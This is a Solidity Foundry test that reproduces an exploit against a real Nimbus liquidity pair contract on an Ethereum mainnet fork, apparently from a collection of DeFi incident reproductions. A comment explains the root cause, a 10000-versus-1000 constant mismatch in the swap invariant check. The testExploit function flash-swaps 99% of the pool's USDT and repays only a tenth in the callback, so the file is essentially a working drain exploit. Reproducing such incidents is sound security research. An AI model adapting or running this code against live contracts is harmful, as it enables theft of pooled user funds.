// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IERC20Custom {
    function transfer(address, uint256) external;
}

/*
    Vulnerable contract: https://etherscan.io/token/0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1#code

    root cause: inconsistent value in the code, 10000 vs 1000.
    // scope for reserve{0,1}Adjusted, avoids stack too deep errors
    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(15));
    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(15));
    require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Nimbus: K');*/
contract ContractTest is Test {
    address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
    address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 13_225_516); //fork bsc at block 13225516
    }

    function testExploit() public {
        console.log("Before exploiting", IERC20(usdt).balanceOf(address(this)));

        uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
        IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));

        console.log("After exploiting", IERC20(usdt).balanceOf(address(this)));
    }

    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        IERC20Custom(usdt).transfer(pair, amount0 / 10);
    }
}
